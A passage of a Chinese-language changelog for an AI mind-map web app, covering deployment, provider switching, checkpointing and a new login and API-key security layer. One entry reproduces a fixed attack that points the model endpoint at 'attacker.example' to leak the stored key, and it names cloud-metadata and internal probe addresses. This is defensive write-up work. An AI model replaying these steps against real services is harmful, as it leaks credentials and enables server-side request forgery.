| v1.21 | 2026-11-14 | CD 换成零入方向端口：ECS 实测出站已恢复（`curl https://github.com` 与 `api.github.com` 均 200），于是放弃"Actions 直连 SSH"（那要求 22 对 `0.0.0.0/0` 开放，是全套部署里最大的敞口），改为在 ECS 上装 **self-hosted runner**（标签 `genai-ecs`），构建仍放 GitHub 托管机、artifact 交给 runner 安装。新增 `deploy/cd-apply.sh`（root 拥有的唯一特权入口，由 `install.sh` 装到 `/usr/local/sbin/genai-cd-apply`）与 `deploy/install-runner.sh`（取 runner 最新版、建 `ghrunner` 用户、注册服务、写单行 sudoers）；`deploy.yml` 改成 `build` + `deploy` 两个 job；不再需要 `ECS_HOST`/`ECS_USER`/`ECS_SSH_KEY` 三个 secret，只用可选仓库变量 `ECS_DOMAIN`；`docs/DEPLOY.md` 第 12 节重写（为什么改、一次性配置三步、排障表） |
| v1.22 | 2026-11-16 | 演示兜底：新增 `frontend/src/demo/presets.ts`（三张预置导图，打成独立 chunk 约 6.6 kB，生产也带）与右上角「演示示例」按钮，**只在用户点击时加载**——模型失败仍然如实报错，不自动顶替（否则演示现场分不清哪张是真生成的），载入后徽章显示「演示模式（非 AI 生成）」、`mapId` 为空所以第一次保存是新建。另修两处"材料不可用"的静默失败：`SOURCE_NOT_PARSED` 诊断（带了几份材料、几份没参与校验）与深层生成按 `source_usage` 过滤引用（此前整批 op 校验失败，白跑一轮模型） |
| v1.23 | 2026-11-16 | 换模型服务商：线上从 `api.deepseek.com` + `deepseek-flash` 换成 `https://api.commandcode.ai/provider/v1` + `z-ai/glm-5.3-flash`（官方 API 峰谷计费，峰时价格翻倍，压测烧钱）。代码零改动即可换家——端点只要满足 `tools` 真被调用、`stream: true` 出增量、`max_tokens` 有上限可学。`agent/provider.py` 的 `DeepSeekProvider` 改名 `OpenAICompatibleProvider`（类名带供应商名会让下一个人以为换家要改代码）；`docs/DEPLOY.md` 第 8 节补「换模型服务商」三条硬要求与换家后的自检清单。换家实测 3/3 出图（80 / 69 / 51 节点），带材料那条 14 条引用逐字对上原文 |
| v1.24 | 2026-11-16 | 长静默心跳：`/api/agent/runs/stream` 新增 `heartbeat` 帧（`{seq, type, waited_ms}`，静默每满 10 秒一帧），两个静默点都发——模型调用 `await` 期间与工具执行期间的等待队列；线上实测 3 路并发最长静默 25.1 秒，而中间链路常见空闲超时是 30–60 秒，超了就会静默掐断连接。前端把 `waitedMs` 接上（此前这个计数器没有任何写入方，`SourceInputs.vue` 的"已等待 N 秒"永不显示），静默达 10 秒时状态行文案换成"模型正在思考，已等 N 秒"（替掉阶段文案而非并列），任何非心跳帧到达即归零。心跳只保活、不带业务进度，EOF 无终态帧仍按连接中断处理 |
| v1.25 | 2026-11-16 | 知识库只读入口：新增 `GET /api/knowledge/library`（列表 + 每份被几张已保存导图引用）与 `GET /api/knowledge/library/{source_id}`（正文前 4000 字），顶栏「知识库」抽屉展示，点开看正文。**材料在生成时才入库**（新 `backend/app/knowledge/remember.py`，开关 `MINDMAP_LIBRARY_REMEMBER`）——上传时还不知道这份材料会不会被用到，废文件会占满库且 `prune` 按 `last_used_at` 保留会一直留着它们。入库后持久 id 与解析时的临时 id 不同，所以事件流最前面多一帧 `sources`（`{seq, type:"sources", mapping:{旧:新}}`），前端就地改本地条目 id；之后保存的导图、节点引用、取原文都用持久 id，重开也能对上。`cited_by` 按"几张导图"计（`source_usage` 与节点 `source_refs` 都算、同图去重），不按命中次数——用户要的是"这份材料还在被用"。入口只读且**不受 `MINDMAP_LIBRARY_SEARCH` 影响**：那个开关管的是生成时要不要从库里捞材料，线上先置 0 做纯展示，等记忆模块落地再开。另修 404 文案：`HTTPException(detail=...)` 会被全局处理器兜成"请求处理失败（HTTP 404）"，改成 `AppError("not_found", …)` 后顶层 `message` 才是真正原因 |
| v1.26 | 2026-11-19 | 合入上游 140 个提交（`aeed033..6674acb`）。**这次的方向是反的**：上游 `28cb730 merge: 合并协作者 dev` 已把本仓库的 `dev` 整体并进去，所以对 `main` 合上游零冲突、合并后的树哈希与上游完全一致（`270d2b7f…`）——本仓库此前所有工作（知识库入口、心跳、部署骨架、CI `fetch-depth` 修复）都在其中，不再是"我们追上游"。真正新增的是 `28cb730` 之后的 85 个提交：三种图型各自的契约与几何（`ContentBase` + `MindMapContent`(树) / `FishboneContent`(手写 60° 主骨) / `FlowContent`(dagre 分层)，`DiagramKind = tree\|flowchart\|fishbone`，六种节点形状）、生成链路改回一次生成并拆成四段（骨架 → 每支检索 → 结构 → 说明两次并发，实测 detail 142 字 / 38.8 秒 / 跨支重复 2，见 `docs/ONE-CALL.md`）、**候选层已删**（`acfdb5b`，生成结果直接落画布，`edit-log.ts` 的 `accept` 降级为历史字面量、接替者是 `generate`）、改动日志（`/api/mindmaps/{id}/edits` 三接口 + `docs/EDIT-LOG.md`）、记忆模块（`backend/app/memory/`，生成时注入相关记忆）、前端重构（`ChatDock` / `MessageFab` / `NodeToolbar` / `VoicePress` / `HistoryDrawer`，画布宽度 800 → 1440）。接口 25 路径/28 端点 → **30 路径 / 34 端点**。基线 1630+610 → **后端 2120（另有 29 subtest）、前端 900（55 文件）** |
| v1.27 | 2026-11-19 | 半棵树也是交付，失败要能操作。此前收尾有六条路径各写一份逻辑，其中**只有两条**按"有树就交树"处理（`_budget_stop` / `_no_progress_stop`），另外四条（工具超时、模型调用额度、连续失败、空转收尾）无条件发 `error`——而前端收到 `error` 会清预览、`content` 也不动，于是用户看着跑了三分钟，最后什么都没拿到，`RunContext.candidate` 里那大半棵树直接作废。现在六条统一走 `_deliver_or_fail()`：有候选就交 `done` 并标 `partial: true` + `partial_reason`，真没树才报错。`partial` 缺省 `None` 而非 `False`（`exclude_none=True`，正常帧与加字段前逐字节相同；缺字段=没说，与"明确完整"不是一回事，前端判 `=== true`），并一路落库（`runs` 表加 `partial`/`partial_reason`，`_ensure_columns` 补列）以便重放同形。另一个拆出来的码是 `model_not_configured`（`backend/app/generation/service.py` 的 `ModelNotConfigured(GenerationError)`，`_config()` 抛它）：它是**唯一一个重试一百次还是同一个结果**的失败，与上游 5xx/超时那类"重试有意义"的必须分开，否则界面只能给出一个骗人的按钮（`except` 顺序也必须排在父类之前，写反就退回成 `generation_failed`）。前端把 `error` 的原话从"直接当文案"改成失败卡片：标题 + 下一步 + 按钮，判据是纯函数 `frontend/src/mindmap/failures.ts::guideForFailure`（逐条有用例），**被禁用的按钮必须写明原因**（只置灰等于沉默，用户只能猜是自己点错了），后端原话与 `code=`/`limit=` 折进 `<details>` 给排障的人看；「重试」复用上一轮参数但**新开 run 身份**（沿用旧 id 会被后端按幂等判成已 done，把上一份失败原样重放回来）。基线 2120 → **后端 2145（另有 29 subtest）、前端 920（57 文件）** |
| v1.28 | 2026-11-20 | 状态保存第一层：**检查点落盘**。`partial` 只解决"收尾时手上还有树"，救不了**进程根本没走到收尾**的那一类——`runs` 的终态由 `_frames` 的 `finally` 写，进程被杀/机器重启时那个 `finally` 不会跑，库里留下一条永远 `running` 的行，而它已经攒了大半棵树却没有任何一帧带出去。现在在 `_generate` 的**第四步（写说明）之前**打一个点：那一刻树已过 `validate_generated_content`、已裁剪（`_clip_tree`）、骨架的颜色与边已套上，是**契约合法的完整树、只是 `detail` 全空**；而紧接着要发两次并发调用写说明，实测整轮最长的一段（56 节点 26 秒上下）。更早不行——结构响应流式解析的中途预览帧只有 `id`/`label`，写进库是 `model_validate` 过不了的树；更晚不必——`publish_tree()` 那一刻 `on_close` 兜得住。通道是 `RunContext.checkpoint`（`CheckpointFn`，同步回调，与 `emit` 同样默认 `None`，不传时行为与加它之前逐字相同）：工具层因此不知道"运行台账"这件事，`runs.checkpoint()` 只对 `status='running'` 生效（迟到的检查点不许把成品盖成半棵树），`finish()` 交出候选时清掉标记（`checkpointed_at` 有值 = 这是半路截的，成品带着它界面会一直提示"说明还没写"），写失败只 warning 不抛。另一半问题是崩溃留下的化石：那条 `running` 行会让同一个 `run_id` **永远 409**，而 `pending()` 只看终态、检查点存得再好也没人读 → `begin()` 在认领前先跑 `runs.sweep_abandoned()`，`updated_at` 超过 `RUN_ABANDONED_SECONDS`（1800 秒 = 线上默认 `max_seconds` 的两倍）的 `running` 判 `failed` + `failure.code="run_abandoned"`，**不动 candidate**；放在 `begin()` 而不是启动钩子，因为单 worker 的机器可能长期不重启，启动时清一次的话故障后第一批用户仍然撞 409，判错的代价也是自愈的（活着的运行收尾时 `finish` 仍能改）。读侧两个字段 `checkpointed_at` / `node_count`（只在检查点行上数一遍节点），`list_runs` 缺省状态加 `failed`（`run_abandoned` 就在里面）。前端 `resumableText` 多一档**排在 `partial` 之前**："上次生成在写说明之前断了，结构还在，已保存 N 个节点"——它不是半棵树，说成"只完成了一部分"会让用户以为要重跑；`resumeRun()` 记一条 `kind:'diagnostic'` 的 `CHECKPOINT` 告警而不是 `partial`。真实链路验证：假模型端点在写说明那一段睡 120 秒，读到一个心跳就断开 → 库里 `cancelled` + `checkpointed_at` + 10 节点、`detail` 全空；**强杀后端进程**（客户端连接保持打开）→ 留下 `running` + `checkpointed_at`，老化 `updated_at` 后下次 `begin()` 把它判成 `failed`/`run_abandoned`，列表里 `node_count=10`。基线 2145 → **后端 2171（另有 29 subtest）、前端 923（57 文件）** |
| v1.29 | 2026-11-20 | 从检查点继续：**补说明，不重跑**。检查点把"结构长好、说明空着"那一份救了下来，但用户载入之后仍然缺说明，而从前的唯一补救是重跑一次生成——再花三次模型调用、十几秒，还可能换出一棵不一样的树，把用户刚看着满意的那份结构顶掉。补的是独立一条路：新工具 `mindmap_fill_details`，只写 `detail`、结构一个字节都不动，复用现成的 `_fill_details`（拆两半并发、五条兜底、额度串行预占）而不是让模型拿 op 一条条改——80 个节点就是 80 条 op（`EditArgs.ops` 上限 100、`selected_ids` 上限 50），且模型会把 `DETAIL_ONLY_PROMPT` 那套调好的东西重写一遍、丢掉"少返回不替它编"这些兜底。五个决定：① **复用 `intent='edit'`**，不新增意图（它本来就要求带 `snapshot`、本来就是"在现有这棵树上改"）；② **沿用那条 `run_id`**——`begin()` 对 `failed`/`cancelled` 是重开同一行、清 `partial`、换掉 `request` 摘要、不动 `candidate`，补完的树落回同一行，台账上是同一次生成的下半场；换新 id 会让一次生成变成两次运行，而那一行若还在 `running`（进程没死、只是前端断过线）就该 409；③ **不给 `node_ids`**（要补哪些由 `_detail_targets` 按 `len(detail) < DETAIL_FILL_FLOOR` 数，模型看不到整棵树、让它圈只会漏）；④ **只加 `instruction`**；⑤ **不用 `_intake`**——它会在没材料时发起外部检索，等于给一棵按旧依据长出来的树塞新依据，改用 `_expand_sources` 按整棵树声称用过的 `source_refs` 从知识库把原文找回来，找不到就按无原文写。两条硬边界：非树给 `not_tree` 不崩在 `content.root` 上；`ctx.publish_tree()` 只在真补上节点时才调（那棵树与进来时逐字节相同，"产出过东西"若为真，之后某条额度耗尽的路径就会把"什么都没发生"包装成半成品交付）。前端不是新入口，而是挂在那条「上次没接住的结果」提示上：**那一行能被重开（`cancelled` / `failed`）时就出现**「补齐说明」（判据不用 `checkpointed_at`——那个戳在收尾交出候选时就被清，失败一次入口就永久消失），点它先载入检查点、再用同一条 `run_id` 发一轮 `edit`（`run_id` 必须在载入**之前**读——载入成功会清 `resumableRun`，之后再读只会拿到 null 然后悄悄新开身份）。新 `RunOptions.runId` 缺省 `undefined` = 老行为。基线 2171 → **后端 2187（另有 29 subtest）、前端 926（57 文件）** |
| v1.30 | 2026-11-21 | 合入队友 41 个提交（`6674acb..0a9b014`），并给这一批打了 **`v0.5.0`**（169 提交、主链路换过两次、新增两层"失败不白跑"，所以进一位次版本号而不是 `v0.4.12`）。队友这批五块：**图**（子图取数与整批建图、从图生成节点结构、跨节点关系补 `kind`/`why`、前端把 relations 画出来）、**体检与建议**（`/optimization` 的 check/suggest 接上界面、生成后自动跑一次只读结构检查、近义冗余与缺失环节两类规则、非树图型返回 422 而不是 500）、**偏好画像**（风格统计层、画像向量与个性化排序、生成时拼进提示词、按导图隔离）、**检索**（DeepSeek Search 作为第六个外部源、Fetch 兜底与链接输入 → 新接口 `POST /api/knowledge/fetch`、`FULL_TEXT_MATERIAL_CHARS = 50_000` 的全塞模式：装得下就不走检索）、**agent**（`served_model` 把"请求的模型名"与"服务端回报的模型名"分开记、深度思考成功时不再误报"只回了文字"）。八处冲突全部是"两类字段并存"或"同一个 bug 取更严的那版"，没有一处要在新旧做法之间二选一：`repository.py` 的补列竞态取上游的 `.lower()` 判据、docstring 合并两版理由，四个补列清单（`model`/`reasoning`、`partial`/`partial_reason`、`served_model`、`checkpointed_at`）全部保留；`service.py` 保留我们统一的 `_deliver_or_fail`（上游那版是两条收尾路径各展开写一份，再各写一份就是这次合并里唯一会真正分叉的地方），只给它加 `served_model` 参数；`tools.py` 的 `full_text`（上游全塞）与 `instruction`（我们的补说明要求）并列，`instruction` 仍在 sections 之后、自查句之前。另有一处**不是冲突、被合并带出来的失败**：`frontend/tests/chat-dock.spec.ts` 里「点补齐说明」的用例自己手写了 `fetchMock`、没有像 `stubFetch()` 那样拦 `/optimization/`，于是上游新加的"生成后自动跑只读检查"挤进了 `calls`（1 条变 3 条）——不是被测行为变了，是背景请求换了位置，补上同一个替身即可，断言一个字没改。接口 30 路径/34 端点 → **31 路径 / 35 端点**；`README.md` 与 `TEAM-GUIDE.md` 的路由组数（8 → 9）与工具清单（补 `mindmap_fill_details`）一并改准。基线 2187 → **后端 2380（另有 29 subtest）、前端 999（63 文件）** |
| v1.31 | 2026-11-21 | 四个并行任务落地（各在自己的 worktree 里做、由协调者按顺序合进 `dev`，四处合并零冲突）。**① 模型服务页面内配置**（`backend/app/settings/`）：`GET`/`PUT /api/settings/model` 与 `POST /api/settings/model/test`，落 SQLite 单行表（`CHECK (id = 1)` 在库层钉住多行），回落**逐字段**：库 → 环境变量 → 空。改完立即生效（1 秒 TTL 进程内缓存；实测一次整树生成里 `_config()` 被调 5 次、分片 27 次，所以缓存不是可选项）。密钥只回打码值（≤8 字符只给 `…`）、清空必须显式 `clear_api_key`（与传值同时给则 400，不静默让一个赢），上游错误体里的整串密钥替换成 `…` 再截断。**第四处读点也接上了**（`backend/app/knowledge/external.py` 的 `_deepseek_config()`，专属 `MINDMAP_DEEPSEEK_TOOLS_*` 仍优先）——只改三处会得到 AGENTS.md 警告的那种"半生效"。面板只接受 OpenAI 兼容接口并在界面写明，`MINDMAP_LLM_MODE` 不进库（那是部署方定的"要不要联网"，面板只显示）。**② 界面文字做减法**：`failures.ts` 12 条分支文案重写（不泄漏 `run_id`、不说"那是排障唯一的线索"）、工具失败行不再露 `mindmap_generate` 这类内部名（新增 `agentToolName()`，未登记工具回落原名）、结构检查的诊断原码默认收起（可逐条或一键展开）——**断言一律是加强而不是放宽**（例如"原码永远可见"改成"默认不可见、展开后精确等于原码、再点收回"）。**③ 容器化**：`docker/` 8 个文件 + `docs/DOCKER.md`，torch 走 CPU 索引（否则拖 `nvidia-*` 让镜像 5GB）并加构建期断言 `torch.version.cuda is None`；SSE 八条防火墙语义照抄 `deploy/nginx.conf`（`proxy_buffering off`、`gzip_types` 不含 `event-stream`）；卷属主两道构建期断言（root 侧 `stat` 比 `10001:10001`、`USER app` 之后真实建文件再删），并用变异测试证明断言会抓（删 `chown`／挪到 `USER app` 之后／退化成 `test -w`／探针只测 `/tmp`／去掉 `exit 1` 五种改坏都红）。**这 8 个文件没有在任何机器上构建或运行过**（本机无 Docker），文档第 12.1 节明确它现在的地位是"一份经过静态核验的草案"，并给出落地前必须做的六步。**④ ASR 本地推理调研**（`docs/RESEARCH-ASR-LOCAL.md`）：结论是**技术上可行但不该为了省钱而换**——云端 `qwen-audio-3.1-asr-flash` 折算每天转写 1 小时约 1.6 元/月，而本地 `sherpa-onnx + SenseVoice(int8) + Silero VAD` 常驻 333–361MB、324 秒录音 RTF 0.0293，与 Docling 那 1.6–2.8GB 峰值同机必 OOM。**MOSS-TTSD 是 TTS 不是 ASR**（范畴错误已在报告里澄清）；MOSS-Audio 是真 ASR 且原生带句级时间戳，但只有 GPU 路径、2C2G 直接排除。唯一真实降级点是**句级 `end_ms` 为推导值**（中位 ±0.213s、最坏 ±1.428s），逐字起点是模型原生的。旧结论"CER 86.4%"被精确认领：那只对 `paraformer-zh-small` 成立，被错误泛化成"本地模型都不行"。按用户决定**不接线**，只留 PoC（含测试音频入库）+ 一个只读的 `asr_switch_check.py`（把三处接线点的当前状态实际检查出来，而不是打印一段会过期的建议）。接口 31 路径/35 端点 → **33 路径 / 38 端点**。基线 2380 → **后端 2427（另有 29 subtest）、前端 1027（64 文件）** |
| v1.32 | 2026-11-21 | 打码值不是密钥：把这一条从"约定"变成"契约"。四任务合并之后我起了一次真实后端做端到端自查（`GET /api/settings/model` 在只有环境变量时正确返回 `…3456`、来源 `env`），顺手用界面上**看得见的那个值**原样 `PUT` 回去，结果真密钥被顶掉了：库里的 `sk-live-…1234` 变成字面量 `…1234`，响应照旧 `api_key_set: true`、来源从 `env` 翻成 `saved`——此后每一次模型调用都 401，而面板显示"刚配好"。这条路上前端其实走不到（`SettingsPanel.vue` 只在用户真打字时才传 `api_key`，打码值只放在 placeholder 里），所以它属于**接口契约缺一道防线**而不是界面 bug；但正是这种"现在走不到"的路径最容易在下一次改动里被走到（把 placeholder 换成 value、写个脚本批量改配置、直接调 `PUT` 的第三方）。修法是后端拒绝，不是静默忽略：`save()` 里提交的 `api_key` 若等于**库里那把**或**生效那把**（含来自环境变量的）的打码值 → 400 `settings_api_key_masked`，文案直说"打码值不是密钥本身，要改请重新粘贴完整的值"。两处都要比：密钥只在环境变量里时 `saved().api_key` 是空串、`mask_api_key("")` 也是空串，只比库会正好漏掉我复现出来的那一路，而这一路最疼（打码值一旦落库就顶掉环境变量那把真密钥，来源标签还会说"你在面板里设的"）。同一个判据也加进 `POST /api/settings/model/test`：打码值拿去发真请求会得到 401，而那一层会把 401 翻译成"密钥被拒"，用户于是去供应商后台换一把本来没问题的密钥——测试连接该在发请求之前就说清，用例断言 `sent == []`。三条用例（库里那把、环境变量那把、测试连接不发请求）。基线 2427 → **后端 2430（另有 29 subtest）、前端 1027（64 文件）** |
| v1.33 | 2026-11-22 | P0-1：**无鉴权 + 任意 `base_url` = 三步把已存密钥明文送到任意地址**。review 里给的三步实测是：`PUT /api/settings/model {"base_url":"https://attacker.example"}` → 200；`POST /api/settings/model/test {}`（空 body 走"回落生效值"这条免费路径）→ 200；密钥随 `Authorization: Bearer sk-REAL-SECRET-…` 到了 `https://attacker.example/chat/completions`。攻击者既不需要知道密钥，也不需要读得到响应。同一个面还能把地址改成内网地址当探针（`169.254.169.254`、`redis:6379`）。两层一起修。**第一层，把"发请求之前先挡一道"放进代码**：`backend/app/settings/probe.py` 新增 `_refuse(base_url)`，拒非 http(s)、拒无主机名、拒 `localhost`/`::1`/`.local`、拒 `is_private`/`is_loopback`/`is_link_local`/`is_reserved`，并额外拒 `is_unspecified`/`is_multicast`——`0.0.0.0` 在多数系统上连的是本机而 `is_private` **不覆盖**它，只写 `is_private` 的实现会漏这一格。开关 `MINDMAP_SETTINGS_ALLOW_PRIVATE`（**每次现读**环境变量，不是模块常量，否则 `monkeypatch.setenv` 对它无效、用例也钉不住"改了开关要重启"这个前提）同时放开本机与内网，没有更细的粒度是有意的：要连 Ollama 的人通常也要连宿主机的 `host.docker.internal`。`probe()` 开头自己再问一次 `_refuse()`，接口层则返回 400 `settings_base_url_refused`——400 是"这个地址不许填"，`ok=false` 是"填了但不通"，两种信号不能混。最关键的一条断言不是"返回了 ok=false"（超时、连不上、密钥被拒也全是 `ok=false`），而是**假客户端一次都没被调用**：伤害发生在请求发出去的那一刻。**第二层，改地址要留下痕迹**：`PUT` 的响应新增 `notice`，"地址改了、上次测试的结论对新地址不成立、建议现在点一次"。只提醒不强制——"先填地址、等供应商开白名单"是合法用法，强制先测通会把这条路堵死。两个不提醒的边界：同值重复保存（`before == after`），以及 `before` 为空（从"什么都没配"到"填了个地址"是首次配置，没有任何旧结论可作废，弹"之前那次测试不成立"会让人去找一次并不存在的测试）。前端 `SaveModelSettingsResponse` 加 `notice?`、store 加 `notice` ref（与 `error` 分开：混进 `error` 会出现"红色的成功"）、面板用中性色那一行显示，**点一次「测试连接」就清掉**（留着像测试没生效）。**nginx 那层**：`docker/nginx.conf` 给 `/api/settings/` 单独一段 `auth_basic` + `auth_basic_user_file`（`/api/` 整块仍然匿名，这是本轮有意的边界——线上 `deploy/nginx.conf` 本来就把整块 `/api/` 护住了，缺口只在容器版与代码层自身），密码文件由 compose 只读挂载（`HTPASSWD_FILE`，缺文件时设置面板**一律 500 的 fail closed**，退回匿名等于把"忘了配"变成"等于没配"）；`docker/verify-static.py` 加 9 条断言（95 → **102 项全 PASS**），其中一条反向钉住 `location /api/` 里**不该**出现 `auth_basic`。基线 2430 → **后端 2456（另有 29 subtest）、前端 1031（64 文件）**。 |
| v1.34 | 2026-11-23 | 账号系统第一片：**身份层落地，但一条请求都还不拦**。这是六片计划里的 ①（其余五片：`api_key_host` 绑定 + SSRF、BYOK 拆表 + ContextVar、免费额度、最小数据隔离、文档 + 前端登录态），顺序是刻意的——一次把门禁与身份一起翻掉，合并当天所有人（包括自己和队友）都进不去，而"进不去"没有旁路可验证。新增 `backend/app/auth/`：`store.py`（两张表 + 口令哈希 + 会话解析）、`identity.py`（ContextVar + 纯 ASGI 中间件 + cookie 读写）、`router.py`（五个端点）。**口令用标准库 `hashlib.scrypt`（n=2^14 / r=8 / p=1，实测 36 毫秒、约 16MB）而不是引 `passlib`/`bcrypt`/`python-jose`**：2C2G 单机少一个依赖少一份部署风险，36 毫秒对登录这种低频动作无感、对离线爆破却把每个候选口令的成本抬到不可行。哈希串写成 `scrypt$n$r$p$<salt_hex>$<hash_hex>`——**参数进串**，将来调参不会让老密码全部失效；只存裸哈希的话改一次常量等于把所有人作废，而那时没人知道为什么登不上。校验时按串里那组参数重算，并对 n/r/p 设上限：一行被改成 `n=2^30` 的记录会让进程申请几百 GB，那是拒绝服务而不是校验失败。**不用 JWT**：只有一台机器、一个进程、一个 SQLite 文件，而 JWT 换来的是**撤销不了**——用户点登出、或发现密钥泄漏要踢人，无状态 token 只能等它过期；"可撤销"是这次整改的硬要求，所以先满足它。会话 token **只存 `sha256`**：库文件泄漏（备份、误传、`MINDMAP_DB_PATH` 指错）时拿到的是哈希，不是一串能直接用的 cookie——与 `settings.api_key` 明文落库是不同取舍，那把密钥必须能被还原出来去发请求，token 不需要。cookie 是 `mm_session` + `Path=/; HttpOnly; SameSite=Strict`，**走 https 才加 `Secure`**（本机 http 加了部分浏览器直接不收，会让"本机登录不了"变成只在某些浏览器上的故障），https 由 `scope["scheme"]` 与 `X-Forwarded-Proto` 两个来源判。四种身份 `user` / `guest` / `anonymous` 分开而不是把游客并进"未登录"：免费额度那一批要按游客 id 计数。三条安全细节写在代码里：① 登录失败**不区分**"没这个人"与"密码错"（区分开等于提供账号枚举接口），且账号不存在时**仍然算一次哈希**（拿固定的假哈希去校验）——不这么做的话"没这个人"会快 36 毫秒，计时差就是一条精确的枚举信道；② 账号名唯一性按 `COLLATE NOCASE`（`Alice` 与 `alice` 看起来一样，只能是同一个账号），显示保留用户打的大小写；③ 改密码**撤销全部会话**（改密码最常见的动机就是"我怀疑有人进过我的号"）。`repository.connect()` 末尾接 `ensure_auth_schema`——理由与别的表不同：`users`/`sessions` 由**每一个请求的中间件**读，在链最前面才发现"表不存在"等于冷启动第一条请求多付十条 DDL。前端只把调用面搭起来（`client.ts` 五个函数 + `types.ts` 四个类型 + `contract-check.ts` 四条键集断言，没有界面），**`request()` 与另外四处 `fetch` 全部补 `credentials: 'include'`**——只改 `request()` 会让 SSE、上传、导出、导入各自变成"未登录"，而那种 bug 只在门禁打开之后才显形。`CORSMiddleware` 补 `allow_credentials=True`（不带它浏览器拒收 `Set-Cookie`，表现为"登录返回 200 但下一次仍未登录"，网络面板里看不出异常）。两条验收判据：`tests/test_auth.py` 40 个用例，其中 `test_business_endpoints_are_still_open_in_this_batch` **钉住"这一批不许上闸"**（等门禁真打开时它会先红一次，提醒改的人把断言改成"该 401 的 401、该放行的放行"，而不是删掉）；`test_requests_without_a_session_cookie_do_not_touch_the_database` 钉住健康检查与静态资源零数据库开销。接口 33 路径/38 端点 → **38 路径 / 43 端点**（新增 1 组路由）。基线 2456 → **后端 2496（另有 29 subtest）、前端 1031（64 文件，未变）**。 |
| v1.35 | 2026-11-23 | 账号系统第二片：**密钥与地址绑定 + SSRF 三条规则**。P0-1 的第一层（发请求之前挡一道）挡的是"填个地址就把密钥送出去"，但有一个形状它挡不住：攻击者先 `PUT` 把 `base_url` 换成自己的地址（**这一步本来没有密钥出门**），然后等下一次正常生成——那把密钥就随 `Authorization` 头到了新地址。**绑定**：`model_settings` 新增 `api_key_host` 列，记"这把密钥被哪台主机保存过"；`store.resolve()` 只在当前生效地址的主机名与锚点一致时才交出明文，不一致时 `api_key_source` 变成 `unbound`、`api_key` 为空、`configured` 变 false，`POST /api/settings/model/test` 回 400 `settings_key_unbound` 且**一个字节都不发**。四个边界都是被真实问题逼出来的：① **只比主机名**，不比端口与路径——`/v1` 换 `/v2`、Ollama 从 11434 挪到 11435 都不该逼人重填，为这些变动弹提示只会训练出"看到提示就再粘一次"的习惯，而那正是这道防线最怕的输入；换主机才意味着"换了一个会收到这把密钥的对方"。② 锚点**落库**而不是每次读时算：算的话它会跟着改过的新地址一起漂，绑定等于不存在。③ 老库升级时该列补成空串，此时按**那一行自己的 `base_url`** 兜底（同一行的地址与密钥本来就是同一次写入的一对），否则升级当天所有人的已存配置会一起被判成"未配置"、所有人一起"密钥丢了"。④ 清密钥时锚点一起清，留着它会让将来新填的密钥"继承"一个它从未被验证过的地址。**SSRF 三条规则**（`probe._refuse`，按判断顺序）：① 云元数据地址**永远拒**，`MINDMAP_SETTINGS_ALLOW_PRIVATE` 也打不开——内网模型是真实需求所以给它留了开关，而元数据服务上没有任何模型、只有临时凭证；"允许连我自己的模型"不该顺手允许"连任何东西"。② 本机/内网仍由开关决定，开着时**提前返回、跳过 https 检查**（本机 Ollama 常是 `http://127.0.0.1:11434`）。③ 公网地址必须 `https://`——`http://` 会把密钥明文发出去，中间任何一跳都能读到。同批把 `169.254.169.254` 从"内网"表移到"元数据"表，理由是拒绝话术不同：前者要指向开关名，后者不能（正确答案不是"打开开关"）。验收判据仍是**假客户端一次都没被调用**，而不是 `ok=false`——超时、连不上、密钥被拒也全是 `ok=false`。基线 2496 → **后端 2509（另有 29 subtest）、前端 1034（64 文件）**。 |
| **v1.36** | 2026-11-23 | **模型配置按人分开存（BYOK）**：`model_settings` 的主键从「单行 `CHECK (id = 1)`」换成 `owner`（`''` 本站共享 / `user:<id>` / `guest:<id>`），回落链改成「自己那行 → 本站共享那行 → 环境变量 → 空」，`api_key_source` 多一档 `instance` 表示借来的（与 `saved` 分开报，否则「清除自己那行、回公共配置」会变成不敢点的按钮）。部署方 = 这台机器上第一个注册的账号（不设 `MINDMAP_ADMIN`：多一个「忘了设/设错了」的故障形态），只有他能改能看共享那一行（`scope: "instance"`，别人 403 `settings_forbidden`，`GET` 的 `instance` 为 `null`——他改不了、也不该知道部署方用的哪家供应商）。**老库自动迁移**：`RENAME` → 立刻建新表 → `INSERT OR REPLACE` 搬成 `owner = ''` → `DROP`，判据是「有 `id` 列且无 `owner` 列」；逼出一个真缺陷——改名之后 `PRAGMA table_info` 是空集，原判据 `"owner" in columns` 永远为假，于是搬运与删表都不发生、老配置「看起来不见了」，修法是在改名分支里立刻 `_CREATE`（不能留给后面那句 `CREATE IF NOT EXISTS`，它静默不做）。缓存键加 `owner`：漏了会串号——那不是读到旧值，是读到别人的密钥。基线 2509 → **后端 2530（另有 29 subtest）、前端 1039（64 文件）**。 |
| **v1.37** | 2026-11-23 | **登录失败限速：同 IP / 同账号 20 次 + 5 秒防抖**。`authenticate()` 那道 36 毫秒的 scrypt 让每次尝试变贵，但挡不住"一直试"——每秒 20 次的脚本 20 分钟就能扫完常见口令表，所以真正要限的是**速率**，而且必须在**任何哈希计算之前**判掉：顺序反过来的话，被拒的请求照样烧算力，限速本身成了放大器（用例 `test_a_throttled_login_does_not_touch_the_hash` 钉这一点，它 monkeypatch 了 `store.authenticate` 并断言被限的那次调用次数为 0）。新增 `backend/app/auth/throttle.py` + `login_attempts` 表（`bucket` 主键、`failures`、`first_at`、`last_at`，时间用 epoch 秒——这张表只做减法，不参与跨表排序也不给人看）。**两个桶取严**：`ip:<地址>` 与 `acct:<小写账号名>` 各记一份。只按账号限，撞库（一个口令试很多账号）绕过；只按 IP 限，NAT 出口后面的人互相拖累，而移动网络换 IP 太便宜。规则是 15 分钟滑动窗口内前 `MAX_FAILURES=20` 次失败回 401，之后每次都要等 `COOLDOWN_SECONDS=5` 秒（429 + `Retry-After`）——20 次之后封顶 12 次/分钟；窗口滑出后重新拿到 20 次，"昨晚忘了密码"不会欠到第二天。**成功只清账号桶、不清 IP 桶**：清 IP 桶会让持有一个有效账号的人用它给自己重置后继续撞别人，而那正好是最需要防的形状；这条比"成功即清零"的字面口径收紧一格，是刻意的。**降级方向是放开**——读写这张表抛错只 `logger.error` 并按没有记录处理，因为"限速表坏了把所有人关在门外"比"关掉保护"更糟，而攻击者没法让表坏掉（他得先拿到写锁）。`client_ip()` 的顺序也是刻意的：`X-Real-IP` 优先（两份 nginx 都写 `$remote_addr`，是直连那一跳的真实地址），`X-Forwarded-For` 取**最后一个**而不是第一个——最左那个是客户端自己声称的，把它当真相等于让攻击者填什么就是什么；都没有才退回 `scope["client"][0]`，连它也没有就归成一个桶（不是"不限"，是"所有身份不明的人共用一个桶"）。为此给 `AppError` 加了 `headers` 通道：`Retry-After` 